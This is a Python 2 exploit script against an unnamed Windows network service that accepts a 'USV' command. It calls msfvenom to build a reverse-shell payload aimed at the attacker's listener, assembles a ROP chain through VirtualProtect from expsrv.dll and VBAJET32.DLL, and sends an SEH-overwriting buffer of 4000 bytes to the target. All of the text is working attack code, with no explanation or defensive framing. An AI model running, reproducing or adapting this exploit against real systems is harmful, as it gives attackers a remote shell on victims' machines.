import socket
import struct
import subprocess
import os
import sys

if len(sys.argv) < 5:
    print '[*] USAGE: {} <rhost> <rport> <lhost> <lport>'.format(sys.argv[0])
    exit()

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])
LHOST = sys.argv[3]
LPORT = sys.argv[4]

msfvenom_str = 'msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b "\\x00\\x0a\\x0d\\x20\\x25" -f python -v shellcode -o sc.py'.format(LHOST,LPORT) 

p = subprocess.Popen(msfvenom_str.split(' '),stdout=subprocess.PIPE,stderr=subprocess.PIPE)
out,err = p.communicate()

try:
    from sc import shellcode
except:
    print '[-] Failed to generate shellcode'
    exit()

def create_rop_chain():

	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	0x0f9e65cd,
	0xFFFFFDFF,
	0x0f9d6ba2,
	0x0f9eda97,
	0x41414141,
	#[---INFO:gadgets_to_set_esi:---]
	0x0f9f1dec,  # POP EDX # RETN [expsrv.dll] 
	0x0fa021cc,  # ptr to &VirtualProtect() [IAT expsrv.dll]
	0x0f9ea2a7,  # MOV ECX,DWORD PTR DS:[EDX] # SUB EAX,ECX # RETN [expsrv.dll] 
	0x0f9df8a5,  # PUSH ECX # SUB AL,5F # POP ESI # POP EBP # RETN 0x24 [expsrv.dll] 
	0x41414141,  # Filler (compensate)
	#[---INFO:gadgets_to_set_ebp:---]
	0x0f9a2c87,  # POP EBP # RETN [VBAJET32.DLL] 
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x0f9e24f9,  # & push esp # ret 0x08 [expsrv.dll]
	#[---INFO:gadgets_to_set_ebx:---]
	#[---INFO:gadgets_to_set_edx:---]
	0x0f9f2137,  # POP EDX # RETN [expsrv.dll] 
	0xffffffff,  #  
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	#[---INFO:gadgets_to_set_ecx:---]
	0x0f9ef12a,  # POP ECX # RETN [expsrv.dll] 
	0x0f9a5cc3,  # &Writable location [VBAJET32.DLL]
	#[---INFO:gadgets_to_set_edi:---]
	0x0f9a3aa8,  # POP EDI # RETN [VBAJET32.DLL] 
	0x0f9eaaab,  # RETN (ROP NOP) [expsrv.dll]
	#[---INFO:gadgets_to_set_eax:---]
	0x0f9eccf2,  # POP EAX # RETN [expsrv.dll] 
	0x90909090,  # nop
	#[---INFO:pushad:---]
	0x0f9f30c2,  # PUSHAD # RETN [expsrv.dll] 
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

esp_adjust="\x81\xC4\x98\xFE\xFF\xFF"
junk = "\x41"*154
rop = create_rop_chain()
junk2 = "\x42"*(966-(len(junk)+len(rop)+len(shellcode)+len(esp_adjust)))
seh = struct.pack("I",0x0f9a264d)
buf=junk+rop+esp_adjust+shellcode+junk2+seh
buf += "\x43"*(4000-(len(junk)+len(seh)+len(rop)+len(junk2)+len(shellcode)))

cmd = "USV "+buf+"\r\n\r\n"

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(cmd)

except:
    print '[-] Exploit failed'
    exit()
    
